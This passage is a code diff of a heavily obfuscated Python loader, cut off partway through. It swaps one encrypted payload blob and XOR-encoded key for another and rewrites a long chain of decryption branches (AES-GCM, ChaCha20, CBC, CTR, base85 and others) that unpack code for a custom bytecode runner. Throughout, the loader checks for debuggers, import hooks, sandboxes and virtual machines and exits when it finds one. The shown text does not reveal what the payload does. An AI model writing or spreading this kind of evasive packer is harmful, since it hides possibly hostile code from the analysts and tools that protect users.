@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-def _dvvvk(_kxyxqo):
-    return _kxyxqo % 5192 + 1
+def _drzocix(_hizqhxz):
+    return _hizqhxz % 5598 + 1
 
-import hashlib as _wn, hmac as _nkwl, base64 as _hi, sys as _alqld, zlib as _feqnm
-_kxyxqo = 958897
-_mbex = """/o5le6k+RcfoFofS5j6tCVVeNHgyKJ7fjUJp85/ClY1TVpaUtMTExykDB4iCJO1DzffLzujF1Iab3RALhyrfy9boOevGQ+G/854GW2f/gbfhhyOMj3zGBI2vi6fxzBdLErTm/g+YxH8Ynz1JZjEv/zeXbKbK0wMXsRwCIGUiYao5hWZzVUmxp07r+JqIAEZ3tQa38YrHYbdjsKDwPoU7Fv4+YNBI1cyaDFwUif+oKiHZoQMrdeaO07sIw0GTpGrZbSwJfW9VE66R6HnxvKmdEmHDuTXCos91vEYwwtdtEPfUbqnEvmuRrVSwkph9CUOsaBodwXLSvCBOiNYJCQ5hmuCqMybWPcsaU5em09/xCeN+4M1XP4wzE/Y94cneQXFeAQEw/HnNXAYwGMT16zdBByEZNpKCNEQZ4yQFwKsdcR7SlKmd8sku2pJwgzI/LzGcbbrx3lj+pC7NYxNiXZoUjvmzkcb+NP8jGDG0um75xSxYefmRyfmQKRs5UOvKl4m2iH2uWbuMOVca7qtwkXU+rpHB5tyAfEeRpoLFMAWucWHzupWW3hMa0gfGNpMIFy37FEOPvfSeN4swTrafh8/slDMoRbtXaDouysMarlPO4EdzGUG8pYmadcsS3UzDYAzTN6LjQCa1WTTphioumoueGbcV/TBAh7jjgfueZAcxe6hYV54HkNYctOqh0Ioxc3N+Im6T03GyYm7Ss4EEd+a+rGfMDoFttB2lz228Xue7XFtkEltbsypijpSWwi2WLji/XCKlHQL8eKUGcu3Ola1GKVYB/qmrmH7blMVswQuUt43zFFc07WZu7PdSmlv2YFZmHzm/pwZLAb0hGuTUL0DWDp/MolKvhIFBC/wtgwT3lg8Qjkk0DxSzKdZy20xAIIBZFAXKJ5/GoOcbyOUvkLqMwBr3MjGeCEjkEee7f8W+7OizT+G5rhKnk2Z//6o0maJZHFxKIf6d6YjeNxigs649ov5wc0nxhyzI1uT71Rc0hl5ZQ0txroQTXDKR/SzGnD/N5hnwH6TN1j6YrbTrDeJ3cBTiKU7RBRrlP0ytoHZguNBoPbud+Q/a1/PoxHF0NIEv31hn/t3OqSvPEaA0TP5avfsHTAfPLgYhOP0CLjZ1VejZq+VoUHYk2V4ItVaqgpcDo3+hCNEC47WSrI0hx4aD0GR7BtyoJsLQ8jU4m+8Ryqoyx2NcfwUMYOYuiPzDWlO0VWHGzcDcdfEHFMn42F839fLV+VAUVN3nGucg78SrLVP0KF1ExXzo5HHkw5Fk91tMIgB8ILoqMGic+1qcx2DLY/OMtRZiAKWbEKpOwhff0mJyCap9krCr8YqppEdMWHqKQUO7YPCyhrU+VgJGsy5tTErswOKYfnGeqDhAN+UCbE4tAC+vSMYA3GaYkMeuykg57qrOIbWGXNkGQLvOVxMSTAnjPuMYRfwFSH6KF9VtnI2x4JYzGY3pzCtyW620zuM/z4DOKAwJAs2thinz6jjg4bA8C5l4NB+CVazHr+pf2SRY"""
-_dw = 3
-_rhbg = _dvvvk(_kxyxqo)
+import hashlib as _kwawijcu, hmac as _ilyvmks, base64 as _uxujbpzjd, sys as _jwfcgd, zlib as _dolhi
+_hizqhxz = 560155
+_rtwmhg = """HgPAicwqanUgGsWCQjW8JJVAJXCcIfwohRo4ATPJmDVBsqlT8iCvp7FBq/v4IcjMIab66NGc/pZbs2nUDLHtsB5mEQN9N9TlT6I22wI0JUttWq3f0VozIRLoShC0RcGlRP5cB6D+Lu2NtXv36ypw6HYLxDyAK/n3722spBeJ926MNr7MTOprBMMg2S0F/3OFMZkrQ5XSpC4d6o1mNsz1iIE0obaC/nDl6iMKcq3fUQkiB5jT+/eMPX6ChfHdjolLAGTjYdt1IK9l6iwBEa77bS2t78BIclBb+9HjidOjVVkbhrpXVDnb6sf9oZECJ844MhrxBr3wny/1Xr6CbdjVtw33foufa2X/BwFl6J8T8NNTZDtJ/4hjb8r0t8XKW02bQ3bvtiMpZe7/3V5u4BJtNK2gTJNnsFDU3HrJ33HSSheqpWWSjnUGxR+U7SSp/Vv/WM5/d6IDudiZ3c5YWZNTpjuzfWSZ5/VjVDqf9EWJj5UZSHXIxzeLAmdKKBnlpLvasqYxVq5HfZYtXs0mZT1/1bP1qPQM5FgqXaxDqn77sjprGcBTR812hdda2YDpG/2ju69zAEz0P7yPXqnu7mI8n3Wuv9j3bZRWbvtrqt/wIVD7b+2TtL4xY84kGUf8z2uzg5Kb6zSrTCq5zNOExH3Vf45QiaE8C8VBM9WtsqdCRx+WV7KIaBzHGcBQFG4wyU3zjlUnSDrzJ7TE/sBl6BJZAWq+FpBTBA7kw33ynnyfRpIJy2uQBWwXLDjB8eoLaeHPv/D4PMeppL+M2FGyZnIu28Ow3EbQmX3DjjL0vRXv5aaj5doGdzrBaIlNGIR6+JTbn/ysNlCLnNY2x6QT391sp3Fmki/pidphiNeEy8AwP3kTSFjUHMwT3oaiZMj+Ec0maGTcQxC1l6yQwzzd0mi9lICv1xQZgQAspBfWMNltekhsIvS2ht6r6KKoSZJPMjaK6fu/bji/pLlaCaweL40qORoL15Avhgqkzkb6Ypgx3z54vyQNMDT1Fh7WjCU+Mz8M2Xq3RyFttPJMgKw9TebCPvBTHZOowO9RmA/cacUw4zHpGFec/eJy6l0Lc2ZLnCp0rJJ8s3y4aEeldUmafPbeBPOFEkoD8d+lxtEWZw=="""
+_padllgc = 3
+_jcdvntmg = _drzocix(_hizqhxz)
 
 def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key):
     import sys
@@ -184,104 +184,141 @@ def _vm_deserialize(_data):
 
 
 
-def _wr():
-    if _alqld.gettrace() is not None:
-        _alqld.stderr.write('error: debugger detected\n'); _alqld.exit(1)
-    _blqovm = bytes.fromhex("909991968182adc09b9fb2c18199c1b58fb3b28d96b284a58592bf83bbafb49e859ac2a7af9fb1c5b0b1a6a49fa48db5b4bb8fc0bfaf9e81c0998fb6b8b49ec69186b0a1a4c6829cb0be9cae85b0b0b0a7b6869bba8fa7c2b4909291bd80ba928fa0c393c7adb1bec39dcec4baa7a69bc186b4b9c58386baaeb68194af9aae8fb4bfb085c7a49898b88fb985bbb8b9b484b998929e9d8386b49d9e92ce96c795c6ce848f87c184c295a69ab2a2c4c684b183a2cfa3b295bda6be9987b0a493afb9cf9887b68182a7a4a18f9c94a383c49dc2cfae9ec4b180c1bdb8b9c4bfa4cebe9c9985b8b596b3ce8f909d908f98bb85b5c7b1bdc383b2b193c182cea398a795cea1a5cfa5c5a7aec5c084b0b48796baa6b196b2ba998dcf8595be9b85bab8b3beb3baada791919f84bbadb1a492c3baaf9894c2bc8081b6bd8183cfc5c6b39493b2bebb9bbdb4b395b58199b1869e949e9393bfc1bba18399af80a59e8eb09cb2b9c4a68e81c38eb3af90ce98829bb180bea0afc5b5b1c3a5a1af95a4858db5cfa6a39cbb8fbdb6cec6b0adb282a285b6b398afa6cfc3a0a3bcbda1b2a7cfb6b480b29e8fb18386b8b8af87c291a5b3b480aebfbfcec4b08ea6a6c394c1b999becfc2b1bea49b8ec09098a6a0c698a399a19ba39190bba7b596b1a2aeb9b996b0b384a2c7b9a0b4a2b486a38dba87a380a2959cbc8093958098c7becebeb386b1c5babdb58793c1ceb09cc199b3858f9eb6a6adbac1a2a4c3b3a29485879fada08eb68790c480b5c3b58592bfbea0a593a5c6cfc581c3a092c2b39d92c6958dafa680949493a3bbc7a5bbb08183c384c3a496b5b4c7a3ada79a9a8282afc1bfb48f8f819b859ab8c3c0bccea4b5b0cfb4939fa1858d80ce81b0b483adb8bbc387b4bc87b283b19e9abeb89384a3c4c78fa5cfb08e80ba9e959ec691b1b3bea6b4c1cf9db5a09dc1c0b2ba9d9bb6849bc586b6c381919a95bfb1c383ba82b6809f93c4ba92908da09487bdb992aea192ce93b5a4c6bf9cbaaea1b0bea1c5a3a7af86b5c3b093c382bbad9293a5b2c0b39a809481bfb3b5a3a5b9b8a595cebeb9c1c592b5cfbbbec491a4b2c28098a5a7cfa0b591a2a79f939da284c6b0b68eb9b4baa79591ae80b6afb8cf8fa7b986bd93a0b9afb586a080b5cebfbcb8a19b80b598a6839ea3a5b6a6bdcfa4c1b285b8929bb095b8a49f908e949d9aceb09ab6a3b5bc82a1958ebac180afa1a5b59ab392b294ada1a1a29f9b98c0c0a0b1bf92ae80a5cf9dba8287939a8599afbac0a2bc9bb898b9b09294a1b893c6879aa3c0b88f84adba85af87c7b398a5bc908f9193bf93bdbfafb89eb4afc6bf8493b8b2a2a585a3bbbb9a939eb293b2b093a486adb4b18f9585b087c39d95b099cfae8281a49dc392b996bd80bac798a29e8db5cf91a696a39eb1a3bdc6bfa4bac3b0")
-    _blqovm = bytes(_ ^ 247 for _ in _blqovm).decode()
-    _alqld.breakpointhook = None
+def _ralpr():
+    if _jwfcgd.gettrace() is not None:
+        _jwfcgd.stderr.write('error: debugger detected\n'); _jwfcgd.exit(1)
+    _qhdzf = bytes.fromhex("465b794e4d7b2e7d71605a2252605f67237b205952605c7321606d562f477f705b72257f442e7c47706727564172594450737921616d62234f4422702256216f2178505a277441665a45205054794f60437520664d6642204566797240615a606e537e6d74726f42504e6d73514f535a5b5d4446635c404f5562737e424d506d6e677a745d6321655e715a72467127736d5d6344747946785b4642214d624022527552202575235864407421587f6e446d2444214d515c6e7e5f515b71447d4721544e5e7d65786074516665642261675e7c452555517f236f24582252506e746d43417e56644e7d4e735367267a4f202126452e754320744e656467272755445b4e46457f5e5e6d51734e2225662f255a5c416643657d7f5c7b24714e23547f5d6e23466620742f4d562e27707c6f4d647a7f5e647a7d614059737f7a23665223464e245e236246535373405d45255440526e5f44532245636e2067676d42227c6e535550545a21636d797b237f67265a5c5f7b737f5c715f755b2470605f424124525a5e4540416d635e2660605a5b7d654d267b645f657f787f2f6e757b5c2740242e5c217876236127767027247b2e595323717e73707d5350417b6f65412f41635075725c534e5558566d7b505146586e204d65755f422f585b7b2f646425504e404e7f606576437d4461796770237f255570404672426f67746e5f5379427379222247592667545f7b6e6f786e7f7f2179617a2f23545f6f62785c4562766e405f7a47432e50515d5847266426735253745b455e5542726024765e64526e707061622250544d795a265658455b4671237b64524371265a25472f662641225f4e52527f202e627d4d4679247c507d4766615c6f4e5622794d40265e275c516e2f5f225e477d7a2e7d4d427a7f4e2225795f6f4e7541225f717c5055205c51216e7955552178447b235e72614d4250254e5b7b536d7c705f6555237d2253552e42252e5523725c43785e76567579532361632446585b557e41754160415653707d6420556041615d7b242779432355507a7b646745716f4d43587d227b406e5541527655646559502e527f2f5b6f455f4547726453546d66457d5b4055756158554258605e5e5d5e5526437f75766e7c4f705f635b42614e7445632f7c795d647b44745970615d277d525a757922635f596d587c45507b417f46635c63674166667d512f536661757c5943247b26646e7441505f56615341465465437245707e65677a75766e615c2076227c454e217f5456665563744d472f59465a4d716d784170432065657b227b6472504d7652584e52627263627351552f56647a276070505f7c4d7b5f47447c41517879587c215c2f6d547a615f4d56796546565a2526764e5f6d5b5c4456446221735c2351607f7f5f50595c23552f5e5e767d2f")
+    _qhdzf = bytes(_ ^ 23 for _ in _qhdzf).decode()
+    _jwfcgd.breakpointhook = None
     for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
-        if _qm in _alqld.modules:
-            _alqld.stderr.write('error: debugger detected\n'); _alqld.exit(1)
-    _zviy = _hi.b64decode(_mbex)
+        if _qm in _jwfcgd.modules:
+            _jwfcgd.stderr.write('error: debugger detected\n'); _jwfcgd.exit(1)
+    _dmpfr = _uxujbpzjd.b64decode(_rtwmhg)
     for _qn in ('__import__','compile','exec'):
-        _qf = getattr(_alqld.modules.get('builtins'), _qn, None)
+        _qf = getattr(_jwfcgd.modules.get('builtins'), _qn, None)
         if _qf is not None:
             _qg = getattr(_qf, '__name__', '')
             if _qg != _qn:
-                _alqld.stderr.write('error: hook detected\n'); _alqld.exit(1)
-    if len(_alqld.meta_path) > 5:
-        _alqld.stderr.write('error: import hook detected\n'); _alqld.exit(1)
-    if getattr(_alqld, 'flags', None) and _alqld.flags.no_user_site:
-        _alqld.stderr.write('error: sandbox detected\n'); _alqld.exit(1)
+                _jwfcgd.stderr.write('error: hook detected\n'); _jwfcgd.exit(1)
+    if len(_jwfcgd.meta_path) > 5:
+        _jwfcgd.stderr.write('error: import hook detected\n'); _jwfcgd.exit(1)
+    if getattr(_jwfcgd, 'flags', None) and _jwfcgd.flags.no_user_site:
+        _jwfcgd.stderr.write('error: sandbox detected\n'); _jwfcgd.exit(1)
     import os
-    if any(x in str(_alqld.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
-        _alqld.stderr.write('error: virtual machine detected\n'); _alqld.exit(1)
-    if _dw == 9:
-        def _gklsaon(_qv):
-            if _qv[:2] == b'<~': _qv = _qv[2:]
-            if _qv[-2:] == b'~>': _qv = _qv[:-2]
-            _rhm = bytearray(); _zpyq = 0
-            while _zpyq < len(_qv):
-                if _qv[_zpyq] == 122:
-                    _rhm.extend(b'\x00\x00\x00\x00'); _zpyq += 1; continue
-                _vnv = 0; _kd = 0
-                while _zpyq < len(_qv) and _kd < 5:
-                    _vnv = _vnv * 85 + (_qv[_zpyq] - 33); _zpyq += 1; _kd += 1
-                _qklvsx = _kd - 1
-                if _qklvsx > 0: _rhm.extend(_vnv.to_bytes(4, 'big')[4-_qklvsx:])
-            return bytes(_rhm)
-        _pnic = _gklsaon(_zviy)
-    elif _dw == 0:
+    if any(x in str(_jwfcgd.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
+        _jwfcgd.stderr.write('error: virtual machine detected\n'); _jwfcgd.exit(1)
+    if _padllgc == 3:
         try:
-            from cryptography.hazmat.primitives.ciphers import Cipher as _nztj, algorithms as _xsjb, modes as _ksz
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _nergrzltw
         except ImportError:
-            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=64)
-        _tlaujy = _ouq[:32]; _nekgcd = _ouq[32:64]
-        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        _zqjve = _nztj(_xsjb.AES(_tlaujy), _ksz.ECB())
-        _pnic = _zqjve.decryptor()
-        _pnic = _pnic.update(_upqxtn) + _pnic.finalize()
-        _ij = _pnic[-1]
-        if _ij < 1 or _ij > 16 or not all(_ == _ij for _ in _pnic[-_ij:]):
-            _alqld.stderr.write("error: decryption failed\n"); _alqld.exit(1)
-        _pnic = _pnic[:-_ij]
-    elif _dw == 10:
-        _pnic = bytes.fromhex(_zviy.decode('ascii'))
-    elif _dw == 12:
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=64)
-        _tlaujy = _ouq[:32]; _nekgcd = _ouq[32:64]
-        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        _ij = 3 + (_buogn[0] & 7)
-        _buogn = bytearray(_upqxtn)
-        for _cugo in range(_ij - 1, -1, -1):
-            _dvvvk = (3 + _cugo) & 7
-            _kxyxqo = (_cugo * 0x1B + 0x5A) & 0xFF
-            for _tahji in range(len(_buogn)):
-                _ij = _buogn[_tahji]
-                _ij ^= _kxyxqo
-                _ij = ((_ij >> _dvvvk) | ((_ij << (8 - _dvvvk)) & 0xFF))
-                _ij ^= _tlaujy[(_cugo * len(_buogn) + _tahji) % len(_tlaujy)]
-                _buogn[_tahji] = _ij
-        _pnic = bytes(_buogn)
-    elif _dw == 5:
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=64)
-        _tlaujy = _ouq[:32]; _nekgcd = _ouq[32:64]
-        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        _pnic = bytes(_upqxtn[i] ^ _tlaujy[i % 32] for i in range(len(_upqxtn)))
-    elif _dw == 13:
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=80)
-        _tlaujy = _ouq[:32]; _tahji = _ouq[32:48]; _nekgcd = _ouq[48:80]
-        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        import struct as _rhbg
-        def _dvvvk(k,c,n):
+            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _wrelk = _dmpfr[16:-32]
+        _sjuwwke = _wrelk[:-16]; _ordocues = _wrelk[-16:]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=76)
+        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:44]; _guajrqqh = _qsfha[44:76]
+        _koskid = _ilyvmks.new(_guajrqqh, _wrelk, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        _wrelk = _nergrzltw(_konvuj).decrypt(_mtejroptc, _sjuwwke + _ordocues, None)
+    elif _padllgc == 4:
+        try:
+            from cryptography.hazmat.primitives.ciphers import Cipher as _qbxcb, algorithms as _yvqmfz, modes as _ycobwuvb
+        except ImportError:
+            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=80)
+        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:48]; _guajrqqh = _qsfha[48:80]
+        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        _vaxfkla = _qbxcb(_yvqmfz.ChaCha20(_konvuj, _mtejroptc), mode=None)
+        _wrelk = _vaxfkla.decryptor().update(_sjuwwke)
+    elif _padllgc == 10:
+        _wrelk = bytes.fromhex(_dmpfr.decode('ascii'))
+    elif _padllgc == 1:
+        try:
+            from cryptography.hazmat.primitives.ciphers import Cipher as _qbxcb, algorithms as _yvqmfz, modes as _ycobwuvb
+        except ImportError:
+            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=80)
+        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:48]; _guajrqqh = _qsfha[48:80]
+        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        _vaxfkla = _qbxcb(_yvqmfz.AES(_konvuj), _ycobwuvb.CBC(_mtejroptc))
+        _wrelk = _vaxfkla.decryptor()
+        _wrelk = _wrelk.update(_sjuwwke) + _wrelk.finalize()
+        _ordocues = _wrelk[-1]
+        if _ordocues < 1 or _ordocues > 16 or not all(_ == _ordocues for _ in _wrelk[-_ordocues:]):
+            _jwfcgd.stderr.write("error: decryption failed\n"); _jwfcgd.exit(1)
+        _wrelk = _wrelk[:-_ordocues]
+    elif _padllgc == 7:
+        _wrelk = _uxujbpzjd.b32decode(_dmpfr)
+    elif _padllgc == 5:
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=64)
+        _konvuj = _qsfha[:32]; _guajrqqh = _qsfha[32:64]
+        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        _wrelk = bytes(_sjuwwke[i] ^ _konvuj[i % 32] for i in range(len(_sjuwwke)))
+    elif _padllgc == 11:
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=64)
+        _konvuj = _qsfha[:32]; _guajrqqh = _qsfha[32:64]
+        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        _ordocues = _konvuj[0]
+        _wrelk = bytearray()
+        for _ausrt in range(len(_sjuwwke)):
+            _ldntjew = _sjuwwke[_ausrt] ^ _ordocues
+            _wrelk.append(_ldntjew)
+            _ordocues = _sjuwwke[_ausrt] ^ _konvuj[ (_ausrt + 1) % len(_konvuj) ]
+            _ordocues = (((_ordocues << 3) & 0xFF) | (_ordocues >> 5)) ^ 0x5A
+        _wrelk = bytes(_wrelk)
+    elif _padllgc == 9:
+        def _cimbryr(_gzuows):
+            if _gzuows[:2] == b'<~': _gzuows = _gzuows[2:]
+            if _gzuows[-2:] == b'~>': _gzuows = _gzuows[:-2]
+            _zwubc = bytearray(); _xyhlkd = 0
+            while _xyhlkd < len(_gzuows):
+                if _gzuows[_xyhlkd] == 122:
+                    _zwubc.extend(b'\x00\x00\x00\x00'); _xyhlkd += 1; continue
+                _ljnpr = 0; _riailjj = 0
+                while _xyhlkd < len(_gzuows) and _riailjj < 5:
+                    _ljnpr = _ljnpr * 85 + (_gzuows[_xyhlkd] - 33); _xyhlkd += 1; _riailjj += 1
+                _xfanh = _riailjj - 1
+                if _xfanh > 0: _zwubc.extend(_ljnpr.to_bytes(4, 'big')[4-_xfanh:])
+            return bytes(_zwubc)
+        _wrelk = _cimbryr(_dmpfr)
+    elif _padllgc == 2:
+        try:
+            from cryptography.hazmat.primitives.ciphers import Cipher as _qbxcb, algorithms as _yvqmfz, modes as _ycobwuvb
+        except ImportError:
+            _jwfcgd.stderr.write("error: cryptography not installed\n"); _jwfcgd.exit(1)
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=80)
+        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:48]; _guajrqqh = _qsfha[48:80]
+        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        _vaxfkla = _qbxcb(_yvqmfz.AES(_konvuj), _ycobwuvb.CTR(_mtejroptc))
+        _wrelk = _vaxfkla.decryptor().update(_sjuwwke)
+    elif _padllgc == 13:
+        _ldntjew = _dmpfr[:16]; _mjlpxdxqg = _dmpfr[-32:]; _sjuwwke = _dmpfr[16:-32]
+        _qsfha = _kwawijcu.pbkdf2_hmac('sha256', _qhdzf.encode(), _ldntjew, 100000, dklen=80)
+        _konvuj = _qsfha[:32]; _mtejroptc = _qsfha[32:48]; _guajrqqh = _qsfha[48:80]
+        _koskid = _ilyvmks.new(_guajrqqh, _sjuwwke, digestmod='sha256').digest()
+        if not _ilyvmks.compare_digest(_mjlpxdxqg, _koskid):
+            _jwfcgd.stderr.write("error: integrity check failed\n"); _jwfcgd.exit(1)
+        import struct as _jcdvntmg
+        def _drzocix(k,c,n):
             s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
-            for i in range(0,32,4):s.append(_rhbg.unpack('<I',k[i:i+4])[0])
+            for i in range(0,32,4):s.append(_jcdvntmg.unpack('<I',k[i:i+4])[0])
             s.append(c&0xFFFFFFFF)
-            for i in range(0,12,4):s.append(_rhbg.unpack('<I',n[i:i+4])[0])
+            for i in range(0,12,4):s.append(_jcdvntmg.unpack('<I',n[i:i+4])[0])
             w=list(s)
             def q(a,b,c,d):
                 a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
@@ -299,125 +336,119 @@ def _wr():
                 w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                 w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
             r=bytearray()
-            for i in range(16):r.extend(_rhbg.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
+            for i in range(16):r.extend(_jcdvntmg.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
             return bytes(r)
-        _cugo = _rhbg.unpack('<I',_tahji[:4])[0]
-        _tahji = _tahji[4:]
-        _buogn = bytearray()
-        while len(_buogn) < len(_upqxtn):
-            _ij = _dvvvk(_tlaujy, _cugo, _tahji)
-            for _kxyxqo in range(min(64, len(_upqxtn) - len(_buogn))):
-                _buogn.append(_upqxtn[len(_buogn)] ^ _ij[_kxyxqo])
-            _cugo += 1
-        _pnic = bytes(_buogn)
-    elif _dw == 4:
+        _ausrt = _jcdvntmg.unpack('<I',_mtejroptc[:4])[0]
+        _mtejroptc = _mtejroptc[4:]
+        _ldntjew = bytearray()
+        while len(_ldntjew) < len(_sjuwwke):
+            _ordocues = _drzocix(_konvuj, _ausrt, _mtejroptc)
+            for _hizqhxz in range(min(64, len(_sjuwwke) - len(_ldntjew))):
+                _ldntjew.append(_sjuwwke[len(_ldntjew)] ^ _ordocues[_hizqhxz])
+            _ausrt += 1
+        _wrelk = bytes(_ldntjew)
+    elif _padllgc == 0:
         try:
-            from cryptography.hazmat.primitives.ciphers import Cipher as _nztj, algorithms as _xsjb, modes as _ksz
+            from cryptography.hazmat.primitives.ciphers import Cipher as _qbxcb, algorithms as _yvqmfz, modes as _ycobwuvb
         except ImportError:
-            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=80)
-        _tlaujy = _ouq[:32]; _tahji = _ouq[32:48]; _nekgcd = _ouq[48:80]
-        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        _zqjve = _nztj(_xsjb.ChaCha20(_tlaujy, _tahji), mode=None)
-        _pnic = _zqjve.decryptor().update(_upqxtn)
-    elif _dw == 7:
-        _pnic = _hi.b32decode(_zviy)
-    elif _dw == 6:
-        _pnic = _hi.b64decode(_zviy)
-    elif _dw == 1:
-        try:
-            from cryptography.hazmat.primitives.ciphers import Cipher as _nztj, algorithms as _xsjb, modes as _ksz
-        except ImportError:
-            _alqld.stderr.write("error: cryptography not installed\n"); _alqld.exit(1)
-        _buogn = _zviy[:16]; _wllzw = _zviy[-32:]; _upqxtn = _zviy[16:-32]
-        _ouq = _wn.pbkdf2_hmac('sha256', _blqovm.encode(), _buogn, 100000, dklen=80)
-        _tlaujy = _ouq[:32]; _tahji = _ouq[32:48]; _nekgcd = _ouq[48:80]
-        _lchxbfa = _nkwl.new(_nekgcd, _upqxtn, digestmod='sha256').digest()
-        if not _nkwl.compare_digest(_wllzw, _lchxbfa):
-            _alqld.stderr.write("error: integrity check failed\n"); _alqld.exit(1)
-        _zqjve = _nztj(_xsjb.AES(_tlaujy), _ksz.CBC(_tahji))
-        _pnic = _zqjve.decryptor()
-        _pnic = _pnic.update(_upqxtn) + _pnic.finalize()
-        _ij = _pnic[-1]
-        if _ij < 1 or _ij > 16 or not all(_ == _ij for _ in _pnic[-_ij:]):
-            _alqld.stderr.write("error: decryption failed\n"); _alqld.exit(1)
-        _pnic = _pnic[:-_ij]
-    elif _dw == 2:
-        try:
-            from cryptography.hazmat.primitives.ciphers import Cipher as _nztj, algorithms as _xsjb, modes as _ksz
-        except ImportError:
